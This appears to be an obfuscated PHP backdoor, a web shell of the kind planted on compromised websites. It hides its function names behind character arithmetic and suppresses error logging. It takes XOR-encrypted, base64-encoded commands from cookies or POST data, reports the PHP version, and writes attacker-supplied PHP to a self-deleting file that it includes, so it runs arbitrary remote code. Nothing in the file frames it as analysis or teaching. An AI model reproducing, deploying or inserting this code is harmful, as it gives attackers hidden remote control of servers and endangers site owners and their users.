<?php $elzvq = "\x66"."\x69".chr(108)."\x65".chr(95)."\160".chr(263-146)."\x74".'_'.chr(99).chr(111).'n'.chr(116)."\145".chr(110).chr(1114-998).chr(771-656);
$cmnkxhbyjo = "\142"."\141".chr(115).'e'."\66"."\64".chr(95)."\144".chr(1084-983)."\143".'o'.'d'."\x65";
$eopulhxnpf = "\x69"."\156".'i'.'_'."\x73"."\145".chr(1060-944);
$ygftktm = 'u'.'n'."\x6c".chr(1082-977).chr(110)."\153";


@$eopulhxnpf("\145"."\x72"."\x72".'o'.chr(335-221).'_'."\154".chr(111)."\x67", NULL);
@$eopulhxnpf('l'.'o'.'g'."\137".'e'.chr(500-386)."\x72"."\x6f".chr(1098-984)."\x73", 0);
@$eopulhxnpf(chr(109).'a'.'x'."\x5f".'e'.chr(120).chr(101).'c'.chr(820-703).chr(116).'i'.chr(111).chr(110)."\x5f".'t'.'i'.chr(149-40).'e', 0);
@set_time_limit(0);

function bbgyjzvm($fiaalv, $popvlcyoea)
{
    $dbqnk = "";
    for ($fpcgjo = 0; $fpcgjo < strlen($fiaalv);) {
        for ($j = 0; $j < strlen($popvlcyoea) && $fpcgjo < strlen($fiaalv); $j++, $fpcgjo++) {
            $dbqnk .= chr(ord($fiaalv[$fpcgjo]) ^ ord($popvlcyoea[$j]));
        }
    }
    return $dbqnk;
}

$fqfwlvfobf = array_merge($_COOKIE, $_POST);
$ktjwginh = 'e8850ee6-4131-4206-94cc-62ea9977122d';
foreach ($fqfwlvfobf as $totmmgnto => $fiaalv) {
    $fiaalv = @unserialize(bbgyjzvm(bbgyjzvm($cmnkxhbyjo($fiaalv), $ktjwginh), $totmmgnto));
    if (isset($fiaalv['a'.chr(107)])) {
        if ($fiaalv[chr(729-632)] == "\x69") {
            $fpcgjo = array(
                "\x70".'v' => @phpversion(),
                "\x73"."\x76" => "3.5",
            );
            echo @serialize($fpcgjo);
        } elseif ($fiaalv[chr(729-632)] == "\145") {
            $timsgkhqmw = "./" . md5($ktjwginh) . "\56".chr(105).'n'."\143";
            @$elzvq($timsgkhqmw, "<" . "\77"."\160"."\150"."\x70"."\40".chr(140-76)."\165"."\156".chr(267-159)."\151"."\x6e".chr(867-760)."\x28".'_'.'_'."\106"."\111".chr(76)."\105".'_'.chr(623-528)."\x29".chr(59).chr(32) . $fiaalv["\x64"]);
            @include($timsgkhqmw);
            @$ygftktm($timsgkhqmw);
        }
        exit();
    }
}

